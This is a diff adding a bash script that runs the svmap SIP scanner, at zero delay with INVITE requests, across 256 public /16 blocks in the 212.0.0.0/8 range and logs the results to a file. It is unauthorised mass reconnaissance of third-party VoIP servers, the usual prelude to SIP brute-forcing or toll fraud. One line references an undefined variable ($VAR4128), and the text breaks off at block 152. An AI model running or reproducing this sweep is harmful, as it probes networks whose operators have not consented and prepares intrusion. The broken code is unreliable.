@@ -1,22 +1,1314 @@
 #!/bin/bash
 
+# Scan IPv4 range on port sip
+
+echo -e "\nStart scanning ...\n"
+
+VAR0=212.0.0.0/16
+VAR1=212.1.0.0/16
+VAR2=212.2.0.0/16
+VAR3=212.3.0.0/16
+VAR4=212.4.0.0/16
+VAR5=212.5.0.0/16
+VAR6=212.6.0.0/16
+VAR7=212.7.0.0/16
+VAR8=212.8.0.0/16
+VAR9=212.9.0.0/16
+VAR10=212.10.0.0/16
+VAR11=212.11.0.0/16
+VAR12=212.12.0.0/16
+VAR13=212.13.0.0/16
+VAR14=212.14.0.0/16
+VAR15=212.15.0.0/16
+VAR16=212.16.0.0/16
+VAR17=212.17.0.0/16
+VAR18=212.18.0.0/16
+VAR19=212.19.0.0/16
+VAR20=212.20.0.0/16
+VAR21=212.21.0.0/16
+VAR22=212.22.0.0/16
+VAR23=212.23.0.0/16
+VAR24=212.24.0.0/16
+VAR25=212.25.0.0/16
+VAR26=212.26.0.0/16
+VAR27=212.27.0.0/16
+VAR28=212.28.0.0/16
+VAR29=212.29.0.0/16
+VAR30=212.30.0.0/16
+VAR31=212.31.0.0/16
+VAR32=212.32.0.0/16
+VAR33=212.33.0.0/16
+VAR34=212.34.0.0/16
+VAR35=212.35.0.0/16
+VAR36=212.36.0.0/16
+VAR37=212.37.0.0/16
+VAR38=212.38.0.0/16
+VAR39=212.39.0.0/16
+VAR40=212.40.0.0/16
+VAR41=212.41.0.0/16
+VAR42=212.42.0.0/16
+VAR43=212.43.0.0/16
+VAR44=212.44.0.0/16
+VAR45=212.45.0.0/16
+VAR46=212.46.0.0/16
+VAR47=212.47.0.0/16
+VAR48=212.48.0.0/16
+VAR49=212.49.0.0/16
+VAR50=212.50.0.0/16
+VAR51=212.51.0.0/16
+VAR52=212.52.0.0/16
+VAR53=212.53.0.0/16
+VAR54=212.54.0.0/16
+VAR55=212.55.0.0/16
+VAR56=212.56.0.0/16
+VAR57=212.57.0.0/16
+VAR58=212.58.0.0/16
+VAR59=212.59.0.0/16
+VAR60=212.60.0.0/16
+VAR61=212.61.0.0/16
+VAR62=212.62.0.0/16
+VAR63=212.63.0.0/16
+VAR64=212.64.0.0/16
+VAR65=212.65.0.0/16
+VAR66=212.66.0.0/16
+VAR67=212.67.0.0/16
+VAR68=212.68.0.0/16
+VAR69=212.69.0.0/16
+VAR70=212.70.0.0/16
+VAR71=212.71.0.0/16
+VAR72=212.72.0.0/16
+VAR73=212.73.0.0/16
+VAR74=212.74.0.0/16
+VAR75=212.75.0.0/16
+VAR76=212.76.0.0/16
+VAR77=212.77.0.0/16
+VAR78=212.78.0.0/16
+VAR79=212.79.0.0/16
+VAR80=212.80.0.0/16
+VAR81=212.81.0.0/16
+VAR82=212.82.0.0/16
+VAR83=212.83.0.0/16
+VAR84=212.84.0.0/16
+VAR85=212.85.0.0/16
+VAR86=212.86.0.0/16
+VAR87=212.87.0.0/16
+VAR88=212.88.0.0/16
+VAR89=212.89.0.0/16
+VAR90=212.90.0.0/16
+VAR91=212.91.0.0/16
+VAR92=212.92.0.0/16
+VAR93=212.93.0.0/16
+VAR94=212.94.0.0/16
+VAR95=212.95.0.0/16
+VAR96=212.96.0.0/16
+VAR97=212.97.0.0/16
+VAR98=212.98.0.0/16
+VAR99=212.99.0.0/16
+VAR100=212.100.0.0/16
+VAR101=212.101.0.0/16
+VAR102=212.102.0.0/16
+VAR103=212.103.0.0/16
+VAR104=212.104.0.0/16
+VAR105=212.105.0.0/16
+VAR106=212.106.0.0/16
+VAR107=212.107.0.0/16
+VAR108=212.108.0.0/16
+VAR109=212.109.0.0/16
+VAR110=212.110.0.0/16
+VAR111=212.111.0.0/16
+VAR112=212.112.0.0/16
+VAR113=212.113.0.0/16
+VAR114=212.114.0.0/16
+VAR115=212.115.0.0/16
+VAR116=212.116.0.0/16
+VAR117=212.117.0.0/16
+VAR118=212.118.0.0/16
+VAR119=212.119.0.0/16
+VAR120=212.120.0.0/16
+VAR121=212.121.0.0/16
+VAR122=212.122.0.0/16
+VAR123=212.123.0.0/16
+VAR124=212.124.0.0/16
+VAR125=212.125.0.0/16
+VAR126=212.126.0.0/16
+VAR127=212.127.0.0/16
+VAR128=212.128.0.0/16
+VAR129=212.129.0.0/16
+VAR130=212.130.0.0/16
+VAR131=212.131.0.0/16
+VAR132=212.132.0.0/16
+VAR133=212.133.0.0/16
+VAR134=212.134.0.0/16
+VAR135=212.135.0.0/16
+VAR136=212.136.0.0/16
+VAR137=212.137.0.0/16
+VAR138=212.138.0.0/16
+VAR139=212.139.0.0/16
+VAR140=212.140.0.0/16
+VAR141=212.141.0.0/16
+VAR142=212.142.0.0/16
+VAR143=212.143.0.0/16
+VAR144=212.144.0.0/16
+VAR145=212.145.0.0/16
+VAR146=212.146.0.0/16
+VAR147=212.147.0.0/16
+VAR148=212.148.0.0/16
+VAR149=212.149.0.0/16
+VAR150=212.150.0.0/16
+VAR151=212.151.0.0/16
+VAR152=212.152.0.0/16
+VAR153=212.153.0.0/16
+VAR154=212.154.0.0/16
+VAR155=212.155.0.0/16
+VAR156=212.156.0.0/16
+VAR157=212.157.0.0/16
+VAR158=212.158.0.0/16
+VAR159=212.159.0.0/16
+VAR160=212.160.0.0/16
+VAR161=212.161.0.0/16
+VAR162=212.162.0.0/16
+VAR163=212.163.0.0/16
+VAR164=212.164.0.0/16
+VAR165=212.165.0.0/16
+VAR166=212.166.0.0/16
+VAR167=212.167.0.0/16
+VAR168=212.168.0.0/16
+VAR169=212.169.0.0/16
+VAR170=212.170.0.0/16
+VAR171=212.171.0.0/16
+VAR172=212.172.0.0/16
+VAR173=212.173.0.0/16
+VAR174=212.174.0.0/16
+VAR175=212.175.0.0/16
+VAR176=212.176.0.0/16
+VAR177=212.177.0.0/16
+VAR178=212.178.0.0/16
+VAR179=212.179.0.0/16
+VAR180=212.180.0.0/16
+VAR181=212.181.0.0/16
+VAR182=212.182.0.0/16
+VAR183=212.183.0.0/16
+VAR184=212.184.0.0/16
+VAR185=212.185.0.0/16
+VAR186=212.186.0.0/16
+VAR187=212.187.0.0/16
+VAR188=212.188.0.0/16
+VAR189=212.189.0.0/16
+VAR190=212.190.0.0/16
+VAR191=212.191.0.0/16
+VAR192=212.192.0.0/16
+VAR193=212.193.0.0/16
+VAR194=212.194.0.0/16
+VAR195=212.195.0.0/16
+VAR196=212.196.0.0/16
+VAR197=212.197.0.0/16
+VAR198=212.198.0.0/16
+VAR199=212.199.0.0/16
+VAR200=212.200.0.0/16
+VAR201=212.201.0.0/16
+VAR202=212.202.0.0/16
+VAR203=212.203.0.0/16
+VAR204=212.204.0.0/16
+VAR205=212.205.0.0/16
+VAR206=212.206.0.0/16
+VAR207=212.207.0.0/16
+VAR208=212.208.0.0/16
+VAR209=212.209.0.0/16
+VAR210=212.210.0.0/16
+VAR211=212.211.0.0/16
+VAR212=212.212.0.0/16
+VAR213=212.213.0.0/16
+VAR214=212.214.0.0/16
+VAR215=212.215.0.0/16
+VAR216=212.216.0.0/16
+VAR217=212.217.0.0/16
+VAR218=212.218.0.0/16
+VAR219=212.219.0.0/16
+VAR220=212.220.0.0/16
+VAR221=212.221.0.0/16
+VAR222=212.222.0.0/16
+VAR223=212.223.0.0/16
+VAR224=212.224.0.0/16
+VAR225=212.225.0.0/16
+VAR226=212.226.0.0/16
+VAR227=212.227.0.0/16
+VAR228=212.228.0.0/16
+VAR229=212.229.0.0/16
+VAR230=212.230.0.0/16
+VAR231=212.231.0.0/16
+VAR232=212.232.0.0/16
+VAR233=212.233.0.0/16
+VAR234=212.234.0.0/16
+VAR235=212.235.0.0/16
+VAR236=212.236.0.0/16
+VAR237=212.237.0.0/16
+VAR238=212.238.0.0/16
+VAR239=212.239.0.0/16
+VAR240=212.240.0.0/16
+VAR241=212.241.0.0/16
+VAR242=212.242.0.0/16
+VAR243=212.243.0.0/16
+VAR244=212.244.0.0/16
+VAR245=212.245.0.0/16
+VAR246=212.246.0.0/16
+VAR247=212.247.0.0/16
+VAR248=212.248.0.0/16
+VAR249=212.249.0.0/16
+VAR250=212.250.0.0/16
+VAR251=212.251.0.0/16
+VAR252=212.252.0.0/16
+VAR253=212.253.0.0/16
+VAR254=212.254.0.0/16
+VAR255=212.255.0.0/16
+
+         echo ----------------- $VAR0----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR0 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR1----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR1 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR2----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR2 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR3----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR3 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR4----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR4 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR5----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR5 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR6----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR6 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR7----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR7 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR8----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR8 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR9----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR9 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR10----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR10 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR11----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR11 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR12----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR12 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR13----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR13 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR14----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR14 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR15----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR15 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR16----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR16 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR17----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR17 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR18----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR18 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR19----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR19 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR20----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR20 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR21----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR21 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR22----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR22 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR23----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR23 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR24----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR24 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR25----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR25 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR26----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR26 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR27----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR27 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR28----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR28 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR29----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR29 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR30----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR30 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR31----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR31 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR32----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR32 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR33----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR33 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR34----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR34 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR35----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR35 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR36----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR36 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR37----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR37 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR38----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR38 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR39----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR39 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR40----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR40 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR41----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR41 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR42----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR42 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR43----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR43 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR44----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR44 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR45----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR45 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR46----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR46 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR47----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR47 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR48----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR48 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR49----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR49 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR50----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR50 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR51----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR51 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR52----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR52 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR53----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR53 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR54----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR54 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR55----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR55 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR56----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR56 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR57----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR57 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR58----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR58 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR59----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR59 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR60----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR60 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR61----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR61 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR62----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR62 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR63----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR63 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR64----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR64 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR65----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR65 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR66----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR66 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR67----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR67 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR68----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR68 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR69----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR69 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR70----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR70 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR71----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR71 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR72----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR72 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR73----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR73 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR74----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR74 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR75----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR75 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR76----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR76 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR77----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR77 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR78----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR78 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR79----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR79 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR80----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR80 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR81----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR81 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR82----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR82 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR83----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR83 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR84----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR84 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR85----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR85 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR86----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR86 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR87----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR87 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR88----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR88 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR89----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR89 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR90----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR90 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR91----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR91 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR92----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR92 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR93----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR93 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR94----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR94 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR95----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR95 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR96----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR96 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR97----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR97 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR98----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR98 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR99----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR99 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR100----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR100 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR101----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR101 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR102----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR102 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR103----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR103 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR104----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR104 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR105----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR105 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR106----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR106 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR107----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR107 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR108----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR108 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR109----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR109 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR110----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR110 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR111----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR111 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR112----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR112 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR113----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR113 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR114----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR114 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR115----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR115 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR116----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR116 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR117----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR117 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR118----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR118 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR119----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR119 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR120----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR120 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR121----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR121 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR122----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR122 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR123----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR123 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR124----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR124 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR125----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR125 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR126----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR126 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR127----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR127 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR128----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR4128 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR129----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR129 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR130----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR130 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR131----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR131 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR132----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR132 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR133----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR133 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR134----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR134 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR135----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR135 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR136----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR136 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR137----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR137 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR138----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR138 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR139----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR139 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR140----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR140 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR141----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR141 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR142----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR142 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR143----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR143 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR144----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR144 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR145----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR145 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR146----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR146 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR147----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR147 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR148----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR148 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR149----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR149 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR150----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR150 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR151----------------
+python svmap.py -p5060-5099,14310,6060,6061 -t0.0 $VAR151 -m INVITE -v >> result.txt
+
+         echo ----------------- $VAR152----------------
